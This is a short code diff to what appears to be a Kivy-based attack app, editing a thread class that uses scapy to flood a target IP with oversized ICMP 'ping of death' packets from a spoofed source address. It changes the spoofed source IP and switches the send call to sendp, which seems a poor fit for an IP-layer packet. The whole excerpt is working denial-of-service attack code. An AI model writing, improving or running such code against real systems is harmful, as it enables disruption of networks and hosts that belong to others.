@@ -1,6 +1,6 @@
 from kivy.clock import Clock
 from threading import Thread
-from scapy.all import IP, ICMP, send
+from scapy.all import IP, ICMP, sendp
 
 class PingOfDeathAttackThread(Thread):
     def __init__(self, app_instance, target_ip, number):
@@ -14,10 +14,10 @@ class PingOfDeathAttackThread(Thread):
 
     def run(self):
         self.running = True
-        SOURCE_IP = "192.168.0.1"
+        SOURCE_IP = "192.168.0.152"
         for _ in range(self.number):
             ping_of_death = IP(src=SOURCE_IP,dst=self.target_ip) / ICMP() / ("T" * 65507)
-            send(ping_of_death, verbose=0, realtime=True)
+            sendp(ping_of_death, verbose=0, realtime=True,)
 
             # Aktualizuj wynik w głównym wątku Kivy
             self.packet_count += 1
